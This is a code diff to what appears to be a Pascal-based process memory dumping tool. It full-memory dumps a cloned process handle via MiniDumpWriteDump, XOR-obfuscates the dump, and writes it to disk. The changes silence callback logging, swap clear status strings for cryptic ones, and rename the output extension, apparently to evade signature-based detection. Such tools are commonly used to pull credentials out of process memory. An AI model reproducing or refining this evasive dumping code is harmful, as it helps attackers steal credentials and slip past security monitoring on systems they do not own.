@@ -326,7 +326,7 @@ bufferSize:=0;
 case callbackInput^.CallbackType of
     uint(MINIDUMP_CALLBACK_TYPE.IoStartCallback):
                         begin
-                        log('IoStartCallback');
+                        //log('IoStartCallback');
 			callbackOutput^.Status := S_FALSE;
                         end;
 
@@ -355,7 +355,7 @@ case callbackInput^.CallbackType of
 
     uint(MINIDUMP_CALLBACK_TYPE.IoFinishCallback):
                         begin
-                        log('IoFinishCallback');
+                        //log('IoFinishCallback');
     			callbackOutput^.Status := S_OK;
                         end;
 
@@ -455,17 +455,17 @@ if processHandle<>thandle(-1) then
       	callbackInfo.CallbackParam := nil;
       //
       dumpbuffer:=HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2048 * 1024 * 128);
-      writeln('[+] calling MiniDumpWriteDump');
+      writeln('[+] the fox has eaten the grapes and is blurring the tracks');
       MiniDumpWriteDump:=getProcAddress(lib,'MiniDumpWriteDump');
-      writeln('[+] Minidump called successfully');
+      writeln('[+] Memory Dumped!');
       result := MiniDumpWriteDump(clone, 0, 0, MiniDumpWithFullMemory, nil, nil, @callbackInfo);
       if result=false then result := MiniDumpWriteDump(clone, pid, 0, MiniDumpWithFullMemory, nil, nil, @callbackInfo);
       if result=false then log('MiniDumpWriteDump failed,'+inttohex(getlasterror,sizeof(dword)));
       //('passati gli if');
       //writeln('BytesRead:'+inttostr(bytesRead ));
       xorbytes(dumpbuffer,bytesread);
-      hFile := CreateFile(pchar(inttostr(pid)+'.dmp.xor'), GENERIC_ALL, 0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
-      writeln('[+] Output file: '+inttostr(pid)+'.dmp.xor'+ ' written - XORkeyToDecode=FF');
+      hFile := CreateFile(pchar(inttostr(pid)+'.dmp.obfusco'), GENERIC_ALL, 0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+      writeln('[+] Output file: '+inttostr(pid)+'.dmp.obfusco'+ ' written - XORkeyToDecode=FF');
       writefile(hfile,dumpBuffer^,bytesRead ,bytesRead,nil);
       closehandle(hfile);
       //
